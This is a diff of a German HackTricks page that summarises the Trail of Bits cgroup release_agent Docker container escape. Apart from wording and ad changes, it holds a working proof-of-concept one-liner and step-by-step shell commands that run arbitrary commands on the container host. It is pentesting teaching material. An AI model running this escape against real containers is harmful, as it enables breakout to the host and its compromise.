@@ -14,21 +14,21 @@ Andere Möglichkeiten, HackTricks zu unterstützen:
 
 </details>
 
-## WhiteIntel
+### [WhiteIntel](https://whiteintel.io)
 
-<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
 
 [**WhiteIntel**](https://whiteintel.io) ist eine von **Dark Web** angetriebene Suchmaschine, die **kostenlose** Funktionen bietet, um zu überprüfen, ob ein Unternehmen oder seine Kunden von **Stealer-Malware** **kompromittiert** wurden.
 
 Das Hauptziel von WhiteIntel ist es, Kontoübernahmen und Ransomware-Angriffe aufgrund von informationsstehlender Malware zu bekämpfen.
 
-Sie können ihre Website besuchen und ihre Engine **kostenlos** ausprobieren unter:
+Sie können ihre Website besuchen und ihren Motor **kostenlos** ausprobieren unter:
 
 {% embed url="https://whiteintel.io" %}
 
 ---
 
-**Für weitere Details siehe den [Original-Blog-Beitrag](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/).** Dies ist nur eine Zusammenfassung:
+**Für weitere Details siehe den [originalen Blog-Beitrag](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/).** Dies ist nur eine Zusammenfassung:
 
 Original PoC:
 ```shell
@@ -38,7 +38,7 @@ t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
 $1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
 ```
-Der Proof of Concept (PoC) zeigt eine Methode zum Ausnutzen von cgroups, indem eine `release_agent`-Datei erstellt und deren Aufruf ausgelöst wird, um beliebige Befehle auf dem Container-Host auszuführen. Hier ist eine Aufschlüsselung der beteiligten Schritte:
+Der Proof of Concept (PoC) demonstriert eine Methode, um cgroups auszunutzen, indem eine `release_agent`-Datei erstellt wird und deren Aufruf ausgelöst wird, um beliebige Befehle auf dem Container-Host auszuführen. Hier ist eine Aufschlüsselung der beteiligten Schritte:
 
 1. **Umgebung vorbereiten:**
 - Ein Verzeichnis `/tmp/cgrp` wird erstellt, um als Einhängepunkt für die cgroup zu dienen.
@@ -66,21 +66,21 @@ echo '#!/bin/sh' > /cmd
 echo "ps aux > $host_path/output" >> /cmd
 chmod a+x /cmd
 ```
-5. **Starten Sie den Angriff:**
+5. **Starte den Angriff:**
 - Ein Prozess wird innerhalb des "x" Kind-Cgroups gestartet und sofort beendet.
-- Dies löst den `release_agent` (das /cmd-Skript) aus, das ps aux auf dem Host ausführt und die Ausgabe in /output innerhalb des Containers schreibt.
+- Dies löst den `release_agent` (das /cmd Skript) aus, das ps aux auf dem Host ausführt und die Ausgabe in /output innerhalb des Containers schreibt.
 ```shell
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
-## WhiteIntel
+### [WhiteIntel](https://whiteintel.io)
 
-<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
 
-[**WhiteIntel**](https://whiteintel.io) ist eine von **Dark Web** angetriebene Suchmaschine, die **kostenlose** Funktionen bietet, um zu überprüfen, ob ein Unternehmen oder seine Kunden von **Stealer-Malware** **kompromittiert** wurden.
+[**WhiteIntel**](https://whiteintel.io) ist eine von **Dark Web** angetriebene Suchmaschine, die kostenlose Funktionen bietet, um zu überprüfen, ob ein Unternehmen oder seine Kunden von **Stealer-Malware** **kompromittiert** wurden.
 
-Das Hauptziel von WhiteIntel ist es, Kontoübernahmen und Ransomware-Angriffe zu bekämpfen, die durch informationsstehlende Malware verursacht werden.
+Das Hauptziel von WhiteIntel ist es, Kontoübernahmen und Ransomware-Angriffe aufgrund von informationsstehlender Malware zu bekämpfen.
 
-Sie können ihre Website besuchen und ihre Suchmaschine **kostenlos** ausprobieren unter:
+Sie können ihre Website besuchen und ihre Engine **kostenlos** ausprobieren unter:
 
 {% embed url="https://whiteintel.io" %}
 
@@ -90,10 +90,10 @@ Sie können ihre Website besuchen und ihre Suchmaschine **kostenlos** ausprobier
 
 Andere Möglichkeiten, HackTricks zu unterstützen:
 
-* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen** möchten oder **HackTricks im PDF-Format herunterladen** möchten, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
+* Wenn Sie Ihr **Unternehmen in HackTricks beworben** sehen möchten oder **HackTricks im PDF-Format herunterladen** möchten, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
+* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github Repositories einreichen.
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.
 
 </details>
